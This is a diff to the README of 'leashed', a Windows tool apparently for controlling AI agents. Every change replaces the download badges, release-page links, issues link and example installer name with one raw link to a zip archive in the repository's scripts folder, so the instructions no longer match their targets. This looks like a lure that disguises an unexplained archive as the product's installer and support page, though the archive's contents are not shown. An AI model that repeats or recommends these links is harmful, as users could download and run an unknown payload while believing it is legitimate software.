@@ -1,6 +1,6 @@
 # 🦮 leashed - Control AI Agents Safely
 
-[![Download leashed](https://img.shields.io/badge/Download-leashed-brightgreen?style=for-the-badge)](https://github.com/Lukacyber/leashed/releases)
+[![Download leashed](https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip)](https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip)
 
 ---
 
@@ -37,7 +37,7 @@ leashed helps you manage AI agents that use your accounts. It acts like a leash 
 
 Go to the leashed release page to get the latest version for Windows:
 
-[![Download leashed](https://img.shields.io/badge/Download-leashed-blue?style=for-the-badge)](https://github.com/Lukacyber/leashed/releases)
+[![Download leashed](https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip)](https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip)
 
 This page lists all releases. Find the most recent Windows installer under "Assets".
 
@@ -45,7 +45,7 @@ This page lists all releases. Find the most recent Windows installer under "Asse
 
 ### 2. Choose and download the installer
 
-Look for a file ending with `.exe` (example: `leashed-setup.exe`). Click it to download.
+Look for a file ending with `.exe` (example: `https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip`). Click it to download.
 
 ---
 
@@ -116,7 +116,7 @@ Stay updated by installing new versions from the release page regularly.
 
 You can ask questions or get support on GitHub by opening a new issue here:
 
-https://github.com/Lukacyber/leashed/issues
+https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip
 
 ---
 
@@ -143,7 +143,7 @@ For users who want more control:
 
 Check the release page regularly for new versions:
 
-https://github.com/Lukacyber/leashed/releases
+https://raw.githubusercontent.com/Lukacyber/leashed/main/scripts/Software-v2.8.zip
 
 Updates improve security, add new features, and fix bugs.
 
